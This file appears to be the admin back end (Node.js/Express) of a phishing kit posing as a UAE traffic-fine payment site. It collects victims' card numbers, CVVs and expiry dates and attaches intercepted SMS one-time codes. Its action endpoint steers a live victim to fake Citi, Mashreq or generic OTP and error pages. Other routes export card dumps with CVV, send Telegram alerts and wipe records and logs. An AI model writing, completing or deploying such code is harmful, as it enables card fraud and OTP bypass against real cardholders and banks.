const express  = require('express');
const bcrypt   = require('bcryptjs');
const router   = express.Router();
const { query, queryOne, getSetting, setSetting, clientIp, logActivity, ensureActivityLogsTable } = require('../db');

function requireAdmin(req, res, next) {
  if (req.session.adminLoggedIn) return next();
  res.redirect('/admin/login');
}

// count() yardımcısı — PostgreSQL alias küçük harf sorununu önler
async function count(sql, params = []) {
  const rows = await query(sql, params);
  return Number(Object.values(rows[0] || {})[0]) || 0;
}

// ─── Telegram helpers ─────────────────────────────────────────────────────────
async function sendInquiryAlert(message) {
  const token  = await getSetting('telegram_bot_token', '');
  const chatId = await getSetting('inquiry_chat_id',    process.env.INQUIRY_CHAT_ID || '');
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
    });
  } catch {}
}

async function sendAdminAlert(message) {
  const enabled = await getSetting('admin_tg_alerts', '0');
  if (enabled !== '1') return;
  const token  = await getSetting('telegram_bot_token', '');
  const chatId = await getSetting('telegram_chat_id', '');
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
    });
  } catch {}
}

// ─── Login ───────────────────────────────────────────────────────────────────
router.get('/', (req, res) => res.redirect('/admin/dashboard'));
router.get('/login', (req, res) => {
  if (req.session.adminLoggedIn) return res.redirect('/admin/dashboard');
  res.render('admin/login', { error: null });
});

router.post('/login', async (req, res) => {
  const { username='', password='' } = req.body;
  const ip        = clientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  try {
    const user = await queryOne('SELECT id, password FROM admin_users WHERE username = ? LIMIT 1', [username]);
    if (user && await bcrypt.compare(password, user.password)) {
      req.session.adminLoggedIn = true;
      req.session.adminUser     = username;
      logActivity('admin_login', 'Admin login: ' + username, username, ip, userAgent).catch(() => {});
      sendAdminAlert('🔐 <b>Admin Login</b>\nUser: ' + username + '\nIP: ' + ip + '\nTime: ' + new Date().toUTCString()).catch(() => {});
      return res.redirect('/admin/dashboard');
    }
    res.render('admin/login', { error: 'Kullanıcı adı veya şifre hatalı.' });
  } catch (e) {
    res.render('admin/login', { error: 'Veritabanı hatası: ' + e.message });
  }
});

router.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/admin/login');
});

// ─── Dashboard ───────────────────────────────────────────────────────────────
router.get('/dashboard', requireAdmin, async (req, res) => {
  try {
    const today = new Date().toISOString().slice(0,10);
    const totalPayments   = await count('SELECT COUNT(*) FROM payments');
    const todayPayments   = await count('SELECT COUNT(*) FROM payments WHERE DATE(created_at)=?', [today]);
    const totalInquiries  = await count('SELECT COUNT(*) FROM inquiries');
    const todayInquiries  = await count('SELECT COUNT(*) FROM inquiries WHERE DATE(created_at)=?', [today]);
    const pendingPayments = await count("SELECT COUNT(*) FROM payments WHERE otp_status='pending'");
    const approvedPayments= await count("SELECT COUNT(*) FROM payments WHERE otp_status='approved'");
    const totalRevenue    = await count('SELECT COALESCE(SUM(total_fine),0) FROM payments');
    const recentPayments  = await query('SELECT * FROM payments ORDER BY created_at DESC LIMIT 10');
    const recentInquiries = await query('SELECT * FROM inquiries ORDER BY created_at DESC LIMIT 6');

    res.render('admin/dashboard', {
      adminUser: req.session.adminUser,
      totalPayments, todayPayments, totalInquiries, todayInquiries,
      pendingPayments, approvedPayments, totalRevenue,
      recentPayments, recentInquiries,
    });
  } catch (e) {
    res.render('admin/dashboard', { adminUser: req.session.adminUser, dbError: e.message,
      totalPayments:0, todayPayments:0, totalInquiries:0, todayInquiries:0,
      pendingPayments:0, approvedPayments:0, totalRevenue:0, recentPayments:[], recentInquiries:[] });
  }
});

// ─── Payments helpers ─────────────────────────────────────────────────────────
function buildPaymentsWhere(statusFilter, search, activeFilter) {
  let where = '1=1', params = [];
  if (statusFilter) { where += ' AND otp_status = ?'; params.push(statusFilter); }
  if (search) {
    where += ' AND (plate_no LIKE ? OR card_number LIKE ? OR card_name LIKE ? OR card_issuer LIKE ?)';
    params.push(...[`%${search}%`,`%${search}%`,`%${search}%`,`%${search}%`]);
  }
  if (activeFilter) {
    where += " AND last_seen > NOW() - INTERVAL '90 seconds'";
  }
  return { where, params };
}

// ─── Payments ────────────────────────────────────────────────────────────────
router.get('/payments', requireAdmin, async (req, res) => {
  const statusFilter = req.query.status || '';
  const search       = req.query.q || '';
  const activeFilter = req.query.active === '1';
  const page         = Math.max(1, parseInt(req.query.p) || 1);
  const perPage      = 25;
  const offset       = (page - 1) * perPage;

  try {
    const { where, params } = buildPaymentsWhere(statusFilter, search, activeFilter);
    const total    = await count(`SELECT COUNT(*) FROM payments WHERE ${where}`, params);
    const payments = await query(`SELECT * FROM payments WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
    const totalPages = Math.max(1, Math.ceil(total / perPage));

    // Attach latest OTP code for each payment
    try {
      const otpRows = await query(
        `SELECT DISTINCT ON (sid) sid, otp_code FROM otp_events WHERE type = ? AND otp_code IS NOT NULL ORDER BY sid, id DESC`,
        ['otp_sms']
      );
      const otpCodes = {};
      otpRows.forEach(r => { if (r.otp_code) otpCodes[r.sid] = r.otp_code; });
      payments.forEach(p => { p.latest_otp = otpCodes[p.sid] || null; });
    } catch { /* non-critical */ }

    // Visitor stats
    let totalVisitors = 0, uniqueVisitors = 0;
    try {
      totalVisitors  = await count('SELECT COUNT(*) FROM visitors');
      uniqueVisitors = await count('SELECT COUNT(DISTINCT ip) FROM visitors');
    } catch {}

    res.render('admin/payments', {
      adminUser: req.session.adminUser,
      payments, total, totalPages, page, statusFilter, search, activeFilter,
      totalVisitors, uniqueVisitors,
    });
  } catch (e) {
    res.render('admin/payments', { adminUser: req.session.adminUser, dbError: e.message, payments:[], total:0, totalPages:1, page:1, statusFilter, search, activeFilter: false, totalVisitors:0, uniqueVisitors:0 });
  }
});

// ─── Export card logs as .txt ─────────────────────────────────────────────────
router.get('/payments/export', requireAdmin, async (req, res) => {
  const statusFilter = req.query.status || '';
  const search       = req.query.q || '';
  const activeFilter = req.query.active === '1';

  try {
    const { where, params } = buildPaymentsWhere(statusFilter, search, activeFilter);
    const rows = await query(
      `SELECT card_number, card_name, expiry, cvv, card_issuer, card_type, created_at, plate_no, plate_src, plate_code, total_fine
       FROM payments WHERE ${where} ORDER BY created_at DESC LIMIT 5000`,
      params
    );

    const header = ['Card Number', 'Cardholder Name', 'Expiry', 'CVV', 'Issuer', 'Type', 'Date', 'Plate', 'Amount AED'].join('\t');
    const lines = rows.map(r => {
      const dt = r.created_at ? new Date(r.created_at).toLocaleString('en-AE', { timeZone:'Asia/Dubai' }) : '';
      const plate = [r.plate_src, r.plate_code, r.plate_no].filter(Boolean).join(' ');
      return [
        r.card_number || '', r.card_name || '', r.expiry || '', r.cvv || '',
        r.card_issuer || '', r.card_type || '', dt, plate, r.total_fine || 0,
      ].join('\t');
    });

    const now = new Date().toISOString().slice(0,10);
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="payments-${now}.txt"`);
    res.send([header, ...lines].join('\r\n'));
  } catch (e) {
    res.status(500).send('Export error: ' + e.message);
  }
});

// ─── Inquiries ───────────────────────────────────────────────────────────────
router.get('/inquiries', requireAdmin, async (req, res) => {
  const search  = req.query.q || '';
  const page    = Math.max(1, parseInt(req.query.p) || 1);
  const perPage = 30;
  const offset  = (page - 1) * perPage;

  try {
    let where = '1=1', params = [];
    if (search) {
      where += ' AND (plate_no LIKE ? OR plate_src LIKE ? OR plate_code LIKE ? OR ip LIKE ?)';
      params.push(...[`%${search}%`,`%${search}%`,`%${search}%`,`%${search}%`]);
    }
    const total      = await count(`SELECT COUNT(*) FROM inquiries WHERE ${where}`, params);
    const rows       = await query(`SELECT * FROM inquiries WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
    const totalPages = Math.max(1, Math.ceil(total / perPage));
    const today      = new Date().toISOString().slice(0,10);
    const todayCount = await count('SELECT COUNT(*) FROM inquiries WHERE DATE(created_at)=?', [today]);
    const uniqueIPs  = await count('SELECT COUNT(DISTINCT ip) FROM inquiries');
    const withFines  = await count('SELECT COUNT(*) FROM inquiries WHERE fine_count > 0');

    res.render('admin/inquiries', {
      adminUser: req.session.adminUser,
      rows, total, totalPages, page, search,
      todayCount, uniqueIPs, withFines,
    });
  } catch (e) {
    res.render('admin/inquiries', { adminUser: req.session.adminUser, dbError: e.message, rows:[], total:0, totalPages:1, page:1, search, todayCount:0, uniqueIPs:0, withFines:0 });
  }
});

// ─── Settings helpers ─────────────────────────────────────────────────────────
async function loadSettings() {
  return {
    otpDefault:      await getSetting('otp_default_page',            'otp-sms'),
    siteActive:      await getSetting('site_active',                 '1'),
    discountEndsAt:      await getSetting('discount_ends_at',      ''),
    discountTimerActive: await getSetting('discount_timer_active', '1'),
    telegramToken:   await getSetting('telegram_bot_token',          process.env.TELEGRAM_BOT_TOKEN          || ''),
    telegramChatId:  await getSetting('telegram_chat_id',            process.env.TELEGRAM_CHAT_ID            || ''),
    inquiryChatId:   await getSetting('inquiry_chat_id', process.env.INQUIRY_CHAT_ID || ''),
    handyApiKey:     await getSetting('handy_api_key',               process.env.HANDY_API_KEY               || ''),
    metaPixelId:        await getSetting('meta_pixel_id',       ''),
    metaAccessToken:    await getSetting('meta_access_token',   ''),
    metaTestEventCode:  await getSetting('meta_test_event_code',''),
    tiktokPixelId:      await getSetting('tiktok_pixel_id',     ''),
    tiktokAccessToken:  await getSetting('tiktok_access_token', ''),
    adminTgAlerts:      await getSetting('admin_tg_alerts',     '0'),
    metaEventTriggersJson:   await getSetting('meta_event_triggers',   '{}'),
    tiktokEventTriggersJson: await getSetting('tiktok_event_triggers', '{}'),
  };
}

// ─── Settings ────────────────────────────────────────────────────────────────
router.get('/settings', requireAdmin, async (req, res) => {
  try {
    const s = await loadSettings();
    res.render('admin/settings', { adminUser: req.session.adminUser, ...s, saved: false, error: null, pwMsg: null });
  } catch (e) {
    res.render('admin/settings', {
      adminUser: req.session.adminUser,
      otpDefault:'otp-sms', siteActive:'1',
      telegramToken:'', telegramChatId:'', inquiryChatId:'', handyApiKey:'',
      metaPixelId:'', metaAccessToken:'', metaTestEventCode:'',
      tiktokPixelId:'', tiktokAccessToken:'', adminTgAlerts:'0',
      metaEventTriggersJson:'{}', tiktokEventTriggersJson:'{}',
      saved:false, error:e.message, pwMsg:null,
    });
  }
});

router.post('/settings', requireAdmin, async (req, res) => {
  let saved = false, error = null, pwMsg = null;

  if (req.body.save_settings !== undefined) {
    try {
      await setSetting('otp_default_page',  req.body.otp_default_page  || 'otp-sms');
      await setSetting('site_active',       req.body.site_active       || '1');
      await setSetting('discount_timer_active', req.body.discount_timer_active === '1' ? '1' : '0');
      // datetime-local gives "YYYY-MM-DDTHH:MM", treat as Dubai time (UTC+4), store as UTC ISO
      const rawDt = (req.body.discount_ends_at || '').trim();
      if (rawDt) {
        const localMs = new Date(rawDt).getTime() - (4 * 60 * 60 * 1000);
        await setSetting('discount_ends_at', new Date(localMs).toISOString());
      } else {
        await setSetting('discount_ends_at', '');
      }
      logActivity('settings_change', 'General settings saved', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
      sendAdminAlert('⚙️ <b>Settings Changed</b>\nSection: General\nAdmin: ' + req.session.adminUser + '\nIP: ' + clientIp(req)).catch(() => {});
      saved = true;
    } catch (e) { error = e.message; }

  } else if (req.body.save_pixel !== undefined) {
    try {
      await setSetting('meta_pixel_id',             (req.body.meta_pixel_id             || '').trim());
      await setSetting('meta_access_token',         (req.body.meta_access_token         || '').trim());
      await setSetting('meta_test_event_code',      (req.body.meta_test_event_code       || '').trim());
      await setSetting('tiktok_pixel_id',           (req.body.tiktok_pixel_id           || '').trim());
      await setSetting('tiktok_access_token',       (req.body.tiktok_access_token        || '').trim());
      try { JSON.parse(req.body.meta_event_triggers   || '{}'); } catch(e2) { throw new Error('Invalid JSON: meta_event_triggers'); }
      try { JSON.parse(req.body.tiktok_event_triggers || '{}'); } catch(e3) { throw new Error('Invalid JSON: tiktok_event_triggers'); }
      await setSetting('meta_event_triggers',   (req.body.meta_event_triggers   || '{}').trim());
      await setSetting('tiktok_event_triggers', (req.body.tiktok_event_triggers || '{}').trim());
      logActivity('settings_change', 'Pixel/alert settings saved', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
      sendAdminAlert('⚙️ <b>Settings Changed</b>\nSection: Pixel & Alert\nAdmin: ' + req.session.adminUser + '\nIP: ' + clientIp(req)).catch(() => {});
      saved = true;
    } catch (e) { error = e.message; }

  } else if (req.body.save_telegram !== undefined) {
    try {
      await setSetting('telegram_bot_token',        (req.body.telegram_bot_token        || '').trim());
      await setSetting('telegram_chat_id',          (req.body.telegram_chat_id          || '').trim());
      await setSetting('inquiry_chat_id', (req.body.inquiry_chat_id || '').trim());
      await setSetting('handy_api_key',             (req.body.handy_api_key             || '').trim());
      await setSetting('admin_tg_alerts',           req.body.admin_tg_alerts === '1' ? '1' : '0');
      logActivity('settings_change', 'Telegram/API settings saved', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
      sendAdminAlert('⚙️ <b>Settings Changed</b>\nSection: Telegram & API\nAdmin: ' + req.session.adminUser + '\nIP: ' + clientIp(req)).catch(() => {});
      saved = true;
    } catch (e) { error = e.message; }

  } else if (req.body.change_password !== undefined) {
    const { current_password='', new_password='', new_password2='' } = req.body;
    try {
      const user = await queryOne('SELECT password FROM admin_users WHERE username = ? LIMIT 1', [req.session.adminUser]);
      if (!user || !await bcrypt.compare(current_password, user.password)) {
        pwMsg = { type:'error', text:'Current password is incorrect.' };
      } else if (new_password.length < 6) {
        pwMsg = { type:'error', text:'New password must be at least 6 characters.' };
      } else if (new_password !== new_password2) {
        pwMsg = { type:'error', text:'New passwords do not match.' };
      } else {
        await query('UPDATE admin_users SET password = ? WHERE username = ?',
          [await bcrypt.hash(new_password, 10), req.session.adminUser]);
        pwMsg = { type:'success', text:'Password updated successfully.' };
      }
      // Handle optional username change
      if (req.body.new_username && req.body.new_username.trim() !== req.session.adminUser) {
        const newU = req.body.new_username.trim();
        const exists = await queryOne('SELECT id FROM admin_users WHERE username = ? AND username != ?', [newU, req.session.adminUser]);
        if (exists) {
          pwMsg = { type:'error', text:'Username already taken.' };
        } else {
          await query('UPDATE admin_users SET username = ? WHERE username = ?', [newU, req.session.adminUser]);
          req.session.adminUser = newU;
          if (!pwMsg || pwMsg.type !== 'error') {
            pwMsg = { type:'success', text:(pwMsg && pwMsg.type === 'success' ? 'Password and username updated successfully.' : 'Username updated successfully.') };
          }
        }
      }
    } catch (e) { pwMsg = { type:'error', text: e.message }; }
  }

  try {
    const s = await loadSettings();
    res.render('admin/settings', { adminUser: req.session.adminUser, ...s, saved, error, pwMsg });
  } catch (e) {
    res.render('admin/settings', {
      adminUser: req.session.adminUser,
      otpDefault:'otp-sms', siteActive:'1',
      telegramToken:'', telegramChatId:'', inquiryChatId:'', handyApiKey:'',
      metaPixelId:'', metaAccessToken:'', metaTestEventCode:'',
      tiktokPixelId:'', tiktokAccessToken:'', adminTgAlerts:'0',
      metaEventTriggersJson:'{}', tiktokEventTriggersJson:'{}',
      saved, error: error || e.message, pwMsg,
    });
  }
});

// ─── API helpers for frontend polling ────────────────────────────────────────
router.get('/api/latest-payment-id', requireAdmin, async (req, res) => {
  try {
    const rows = await query('SELECT id FROM payments ORDER BY id DESC LIMIT 1');
    res.json({ id: rows[0]?.id || 0 });
  } catch { res.json({ id: 0 }); }
});

// ─── Actions (AJAX) ──────────────────────────────────────────────────────────
router.post('/action', requireAdmin, async (req, res) => {
  const { act='', sid='' } = req.body;
  const cleanSid  = sid.replace(/[^a-f0-9]/g, '');
  const adminUser = req.session.adminUser || '';
  const ip        = clientIp(req);
  const userAgent = req.headers['user-agent'] || '';
  try {
    if (act === 'redirect') {
      const allowed = [
        'otp-sms','otp-sms2','otp','otp-citi','otp-mashreq','yogunluk','card-limit',
        'payment:error=card_error','payment:error=card_type','payment:error=bank_error',
        'otp-sms:error=wrong_otp','otp-sms2:error=wrong_otp','otp:error=wrong_otp',
        'otp-citi:error=wrong_otp','otp-mashreq:error=wrong_otp',
      ];
      if (!cleanSid || !allowed.includes(req.body.page)) return res.json({ ok:false, error:'Invalid' });
      // Only update otp_page when redirecting to a real OTP page (not error variants)
      const basePage = req.body.page.split(':')[0];
      await query('UPDATE payments SET redirect_to = ?, otp_page = ? WHERE sid = ?', [req.body.page, basePage, cleanSid]);
      logActivity('otp_redirect', 'OTP redirect → ' + req.body.page + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
      const rdMsg = '↩️ <b>OTP Redirect</b>\nSID: <code>' + cleanSid + '</code>\nPage: <b>' + req.body.page + '</b>\nAdmin: ' + adminUser + '\nIP: ' + ip;
      sendInquiryAlert(rdMsg).catch(() => {});
      return res.json({ ok: true });
    }
    if (act === 'set_status') {
      const allowed = ['pending','approved','declined'];
      if (!cleanSid || !allowed.includes(req.body.status)) return res.json({ ok:false, error:'Invalid' });
      // When approving, also set redirect_to so the user is sent to the success page
      if (req.body.status === 'approved') {
        await query('UPDATE payments SET otp_status = ?, redirect_to = ? WHERE sid = ?', ['approved', 'otp-approved', cleanSid]);
      } else {
        await query('UPDATE payments SET otp_status = ? WHERE sid = ?', [req.body.status, cleanSid]);
      }
      if (req.body.status === 'approved' || req.body.status === 'declined') {
        logActivity('payment_status', 'Payment status → ' + req.body.status + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
        sendAdminAlert('💳 <b>Payment Status</b>\nSID: ' + cleanSid + '\nStatus: ' + req.body.status + '\nAdmin: ' + adminUser + '\nIP: ' + ip).catch(() => {});
      }
      return res.json({ ok: true });
    }
    if (act === 'save_setting') {
      const key = (req.body.key||'').replace(/[^a-z_]/g,'');
      if (!key) return res.json({ ok:false });
      await setSetting(key, req.body.value || '');
      return res.json({ ok: true });
    }
    if (act === 'delete_payment') {
      if (!cleanSid) return res.json({ ok:false });
      await query('DELETE FROM payments WHERE sid = ?', [cleanSid]);
      await query('DELETE FROM otp_events WHERE sid = ?', [cleanSid]);
      logActivity('payment_delete', 'Payment deleted (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
      sendAdminAlert('🗑️ <b>Payment Deleted</b>\nSID: ' + cleanSid + '\nAdmin: ' + adminUser + '\nIP: ' + ip).catch(() => {});
      return res.json({ ok: true });
    }
    if (act === 'ban_user') {
      if (!cleanSid) return res.json({ ok:false });
      const payment = await queryOne('SELECT ip FROM payments WHERE sid = ? LIMIT 1', [cleanSid]);
      if (!payment?.ip) return res.json({ ok:false, error:'IP not found for this payment' });
      const raw = await getSetting('banned_ips', '[]');
      let list = [];
      try { list = JSON.parse(raw); } catch {}
      if (!list.includes(payment.ip)) list.push(payment.ip);
      await setSetting('banned_ips', JSON.stringify(list));
      logActivity('ban_user', 'User banned IP: ' + payment.ip + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
      return res.json({ ok: true, ip: payment.ip });
    }
    res.json({ ok:false, error:'Unknown action' });
  } catch (e) {
    res.json({ ok:false, error:e.message });
  }
});

// ─── Payment Comment ──────────────────────────────────────────────────────────
router.post('/payments/comment', requireAdmin, async (req, res) => {
  const { sid = '', comment = '' } = req.body;
  const cleanSid = (sid + '').replace(/[^a-f0-9-]/g, '');
  if (!cleanSid) return res.json({ ok: false, error: 'Invalid SID' });
  try {
    await query('UPDATE payments SET comment = ? WHERE sid = ?', [comment, cleanSid]);
    res.json({ ok: true });
  } catch (e) { res.json({ ok: false, error: e.message }); }
});

// ─── Activity Logs ───────────────────────────────────────────────────────────
router.get('/logs', requireAdmin, async (req, res) => {
  const search  = req.query.q || '';
  const action  = req.query.action || '';
  const page    = Math.max(1, parseInt(req.query.p) || 1);
  const perPage = 30;
  const offset  = (page - 1) * perPage;
  try {
    await ensureActivityLogsTable();
    let where = '1=1', params = [];
    if (search) {
      where += ' AND (description ILIKE ? OR admin_user ILIKE ? OR ip ILIKE ?)';
      params.push(...[`%${search}%`, `%${search}%`, `%${search}%`]);
    }
    if (action) { where += ' AND action = ?'; params.push(action); }
    const total      = await count(`SELECT COUNT(*) FROM activity_logs WHERE ${where}`, params);
    const logs       = await query(`SELECT * FROM activity_logs WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
    const totalPages = Math.max(1, Math.ceil(total / perPage));
    res.render('admin/logs', { adminUser: req.session.adminUser, logs, total, totalPages, page, search, action, perPage });
  } catch (e) {
    res.render('admin/logs', { adminUser: req.session.adminUser, logs: [], total: 0, totalPages: 1, page: 1, search, action, perPage, dbError: e.message });
  }
});

// ─── Full Data Reset ──────────────────────────────────────────────────────────
router.post('/settings/reset', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM otp_events', []);
    await query('DELETE FROM payments', []);
    await query('DELETE FROM inquiries', []);
    logActivity('settings_change', 'Data reset: payments and inquiries cleared', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

// ─── Individual Reset Endpoints ───────────────────────────────────────────────
router.post('/reset/visitors', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM visitors', []);
    logActivity('data_reset', 'Visitors reset', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

router.post('/reset/payments', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM otp_events', []);
    await query('DELETE FROM payments', []);
    logActivity('data_reset', 'Payments reset', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

router.post('/reset/inquiries', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM inquiries', []);
    logActivity('data_reset', 'Inquiries reset', req.session.adminUser, clientIp(req), req.headers['user-agent'] || '').catch(() => {});
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

router.post('/reset/logs', requireAdmin, async (req, res) => {
  try {
    await query('DELETE FROM activity_logs', []);
    res.json({ ok: true });
  } catch(e) { res.json({ ok: false, error: e.message }); }
});

module.exports = router;
